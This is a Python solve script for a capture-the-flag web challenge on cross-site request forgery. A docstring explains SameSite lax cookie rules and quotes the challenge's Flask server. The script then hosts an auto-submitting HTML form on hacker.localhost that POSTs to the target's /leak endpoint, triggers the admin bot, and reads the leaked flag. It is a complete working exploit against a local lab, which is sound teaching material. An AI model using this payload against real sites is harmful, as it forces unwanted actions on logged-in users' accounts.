import os
import re
import requests
import signal
from flask import Flask


"""
Theory:
	A cross site request forgery attack is an attack, that is based on a user
	already logged in to the site you want to attack. In the case of this challenge
	the login/authentication happens when requesting to /visit endpoint. The login creates
	a session cookie that is stored by the browser. From now on the browser can send along this cookie
	with any request made from the browser. This is a huge security issue.

	To mitigate this issue, certain rules exist, based on which the browser decides when to send along cookies.
	This is especially important for requests made by a document or script loaded by one origin.
	Per default a browser sends along cookies with any request of this type, that originates and goes to the same origin and same site.

	origin = (scheme, host, port), site = effective top level domain + 1

	After we receive the initial cookie via login, the browser checks weather any further requests to http://challenge.localhost
	are made from one of the challenge.localhost sites (same origin, same site) or from another site i.e. hacker.localhost (cross origin, cross site).

	In the challenge the default cookie policy lax is used. This means cookies are only send along with cross site requests, from hacker.localhost to
	challenge.localhost, if the request is done as a navigational event like a link, form, redirect.

    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak" and request.method == "POST":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == hacker_host, f"Invalid `url`, hostname should be `{hacker_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    return "Not Found\n", 404
"""


pat0 = re.compile(".*Now running the web server:\n")
r_pipe1, w_pipe1 = os.pipe()

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)

	os.dup2(w_pipe1, 1)
	os.close(w_pipe1)

	os.execv("/challenge/run", ["/challenge/run"])
	print("Error execv.")
	exit(1)

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)
	os.close(w_pipe1)

	app = Flask(__name__)

	@app.route('/')
	def csrf_leak():
		return """
		<form action="http://challenge.localhost:80/leak" method="POST">
		<button id=leak></button>
		<script>document.getElementById("leak").click();</script>
		</form>
		"""

	app.run("hacker.localhost", 30080, use_reloader=False)

os.close(w_pipe1)

output = os.fdopen(r_pipe1, "r")

while True:
	line = output.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/visit"
		data = {"url": "http://hacker.localhost:30080/"}
		requests.get(url, params=data)
		url = "http://challenge.localhost:80/info"
		data = {"user": "1"}
		r = requests.get(url, params=data)
		print(r.text)
		os.kill(pid, signal.SIGKILL)
